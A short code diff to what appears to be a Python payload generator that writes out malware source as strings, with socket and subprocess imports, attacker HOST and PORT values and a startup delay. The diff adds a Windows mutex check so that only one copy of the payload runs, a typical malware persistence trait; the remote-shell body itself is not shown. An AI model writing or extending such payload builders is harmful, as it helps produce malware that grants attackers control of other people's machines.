@@ -42,6 +42,7 @@ def begin():
     payload += 'import shutil\n'
     payload += 'import base64\n'
     payload += 'import socket\n'
+    payload += 'import win32event, win32api, winerror\n'
     payload += 'import subprocess\n'
     payload += 'from platform import platform\n'
     payload += 'import sys\n'
@@ -50,6 +51,10 @@ def begin():
     payload += 'from time import sleep\n'
     payload += 'HOST = ' + "'" + host + "'" + '\n'
     payload += 'PORT = ' + port + '\n'
+    payload += "mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz2')" + '\n'
+    payload += "if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:" + '\n'
+    payload += "    mutex = None" + '\n'
+    payload += '    sys.exit(0)' + '\n'
     payload += 'sleep(35)\n'
     payload += str(o)
 
@@ -432,6 +437,5 @@ def main():
 if __name__ == '__main__':
 
     main()
-
 
 
